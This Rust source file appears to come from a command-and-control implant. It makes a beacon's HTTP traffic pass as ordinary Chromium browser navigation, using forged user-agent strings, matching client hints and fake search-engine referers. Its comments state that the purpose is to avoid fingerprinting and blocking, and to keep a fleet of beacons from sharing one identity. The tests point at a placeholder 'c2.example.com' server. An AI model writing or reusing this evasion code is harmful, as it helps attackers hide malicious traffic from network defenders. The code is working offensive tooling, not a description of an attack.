//! Web request shaping for the HTTP transport.
//!
//! A default `reqwest` client announces itself: no `user-agent`, a bare
//! `accept: */*`, and none of the client-hint headers a browser sends. That
//! combination is cheap to fingerprint and cheap to block.
//!
//! [`WebProfile`] presents the beacon as an ordinary top-level navigation
//! instead: a coherent Chromium client-hint set whose `user-agent`,
//! `sec-ch-ua`, and `sec-ch-ua-platform` agree with each other.
//!
//! ## Determinism
//!
//! The identity is selected from a hash of the endpoint, so every beacon for
//! one server presents the same client while a fleet pointed at different
//! servers does not collapse into one identical fingerprint. Operators who
//! need a specific identity set `NW_USER_AGENT`; `NW_WEB_PROFILE=plain`
//! disables shaping entirely for debugging.
//!
//! ponytail: no per-request noise table and no rotation. Endpoint-derived
//! identity plus an env override covers the fingerprinting problem; add
//! rotation only if a single server needs to present many clients.

use reqwest::RequestBuilder;
use sha2::{Digest, Sha256};

/// A browser identity the beacon can present as.
///
/// All entries are Chromium-based on purpose: they are the family that sends
/// `sec-ch-ua` and `sec-fetch-*`, so one coherent header template serves them
/// all. Mixing in a Firefox identity would require a second template, and a
/// half-populated Firefox fingerprint is worse than a consistent Chrome one.
struct BrowserIdentity {
    user_agent: &'static str,
    sec_ch_ua: &'static str,
    platform: &'static str,
    accept_language: &'static str,
    referer: &'static str,
}

const IDENTITIES: [BrowserIdentity; 4] = [
    BrowserIdentity {
        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        sec_ch_ua: "\"Chromium\";v=\"131\", \"Google Chrome\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        platform: "\"Windows\"",
        accept_language: "en-US,en;q=0.9",
        referer: "https://www.google.com/",
    },
    BrowserIdentity {
        user_agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        sec_ch_ua: "\"Chromium\";v=\"130\", \"Google Chrome\";v=\"130\", \"Not_A Brand\";v=\"24\"",
        platform: "\"macOS\"",
        accept_language: "en-GB,en;q=0.9",
        referer: "https://www.bing.com/",
    },
    BrowserIdentity {
        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
        sec_ch_ua: "\"Chromium\";v=\"131\", \"Microsoft Edge\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        platform: "\"Windows\"",
        accept_language: "en-US,en;q=0.9",
        referer: "https://outlook.office.com/",
    },
    BrowserIdentity {
        user_agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        sec_ch_ua: "\"Chromium\";v=\"131\", \"Google Chrome\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        platform: "\"Linux\"",
        accept_language: "de-DE,de;q=0.9,en;q=0.8",
        referer: "https://duckduckgo.com/",
    },
];

const ACCEPT_NAVIGATION: &str =
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";

/// Stable 64-bit seed for an endpoint.
fn seed_for(endpoint: &str) -> u64 {
    let digest = Sha256::digest(endpoint.as_bytes());
    u64::from_le_bytes(digest[..8].try_into().expect("sha256 is 32 bytes"))
}

/// The identity index a given endpoint presents as.
fn identity_index(seed: u64) -> usize {
    (seed % IDENTITIES.len() as u64) as usize
}

/// Headers a browser navigation of this identity sends, as ordered pairs.
///
/// Pure so the shape of the header set is testable without a live server.
pub fn navigation_headers(seed: u64) -> Vec<(&'static str, String)> {
    let id = &IDENTITIES[identity_index(seed)];
    vec![
        ("accept", ACCEPT_NAVIGATION.to_owned()),
        ("accept-language", id.accept_language.to_owned()),
        ("cache-control", "max-age=0".to_owned()),
        ("sec-ch-ua", id.sec_ch_ua.to_owned()),
        ("sec-ch-ua-mobile", "?0".to_owned()),
        ("sec-ch-ua-platform", id.platform.to_owned()),
        ("sec-fetch-dest", "document".to_owned()),
        ("sec-fetch-mode", "navigate".to_owned()),
        ("sec-fetch-site", "cross-site".to_owned()),
        ("sec-fetch-user", "?1".to_owned()),
        ("upgrade-insecure-requests", "1".to_owned()),
        ("user-agent", id.user_agent.to_owned()),
        ("referer", id.referer.to_owned()),
    ]
}

/// How a beacon presents its HTTP traffic.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct WebProfile {
    /// Identity seed; selects the browser identity.
    seed: u64,
    /// When false, requests are sent unshaped (debugging).
    shaped: bool,
}

impl WebProfile {
    /// Identity derived from the endpoint, overridable by `NW_USER_AGENT` and
    /// `NW_WEB_PROFILE`.
    pub fn for_endpoint(endpoint: &str) -> Self {
        let shaped = !matches!(
            std::env::var("NW_WEB_PROFILE")
                .ok()
                .as_deref()
                .map(str::trim),
            Some("plain" | "off" | "0")
        );
        Self {
            seed: seed_for(endpoint),
            shaped,
        }
    }

    /// An explicitly unshaped profile, bypassing `NW_WEB_PROFILE`.
    pub fn unshaped() -> Self {
        Self {
            seed: 0,
            shaped: false,
        }
    }

    /// Headers to attach to one request.
    pub fn headers(&self) -> Vec<(&'static str, String)> {
        if !self.shaped {
            return Vec::new();
        }
        let mut headers = navigation_headers(self.seed);
        // An explicit operator choice wins over the derived identity, but the
        // client hints stay consistent with whatever identity was selected.
        if let Ok(ua) = std::env::var("NW_USER_AGENT") {
            let ua = ua.trim().to_owned();
            if !ua.is_empty()
                && let Some(slot) = headers.iter_mut().find(|(name, _)| *name == "user-agent")
            {
                slot.1 = ua;
            }
        }
        headers
    }

    /// Attach the profile to a request under construction.
    pub fn apply(&self, request: RequestBuilder) -> RequestBuilder {
        let mut request = request;
        for (name, value) in self.headers() {
            request = request.header(name, value);
        }
        request
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn endpoint_seeding_is_stable_and_spreads() {
        let a = seed_for("https://c2.example.com");
        assert_eq!(a, seed_for("https://c2.example.com"));
        assert_ne!(a, seed_for("https://other.example.com"));

        // A fleet of distinct endpoints should not collapse onto one identity.
        let mut seen = std::collections::HashSet::new();
        for i in 0..64 {
            seen.insert(identity_index(seed_for(&format!(
                "https://node{i}.example"
            ))));
        }
        assert!(seen.len() > 1, "expected more than one identity in use");
    }

    #[test]
    fn navigation_headers_are_coherent_and_browser_like() {
        let headers = navigation_headers(seed_for("https://c2.example.com"));
        let get = |name: &str| {
            headers
                .iter()
                .find(|(k, _)| *k == name)
                .map(|(_, v)| v.clone())
                .unwrap_or_default()
        };

        let ua = get("user-agent");
        assert!(ua.starts_with("Mozilla/5.0"), "ua must look like a browser");
        assert!(ua.contains("Chrome/") || ua.contains("Edg/"));

        // Client hints must agree with the user agent they accompany.
        let ch = get("sec-ch-ua");
        if ua.contains("Edg/") {
            assert!(ch.contains("Microsoft Edge"), "hint disagrees with Edge UA");
        } else {
            assert!(
                ch.contains("Google Chrome"),
                "hint disagrees with Chrome UA"
            );
        }
        assert!(get("sec-fetch-mode").contains("navigate"));
        assert!(get("sec-fetch-dest").contains("document"));
        assert!(!get("referer").is_empty());

        // Never advertise encodings we cannot decode.
        assert!(headers.iter().all(|(k, _)| *k != "accept-encoding"));
    }

    #[test]
    fn every_identity_produces_a_coherent_header_set() {
        for seed in 0..IDENTITIES.len() as u64 {
            let headers = navigation_headers(seed);
            let ua = headers
                .iter()
                .find(|(k, _)| *k == "user-agent")
                .map(|(_, v)| v.as_str())
                .unwrap();
            let ch = headers
                .iter()
                .find(|(k, _)| *k == "sec-ch-ua")
                .map(|(_, v)| v.as_str())
                .unwrap();
            assert!(!ua.is_empty() && !ch.is_empty(), "seed {seed}");
        }
    }

    #[test]
    fn plain_profile_sends_no_shaped_headers() {
        let profile = WebProfile {
            seed: seed_for("https://c2.example.com"),
            shaped: false,
        };
        assert!(profile.headers().is_empty());
    }
}
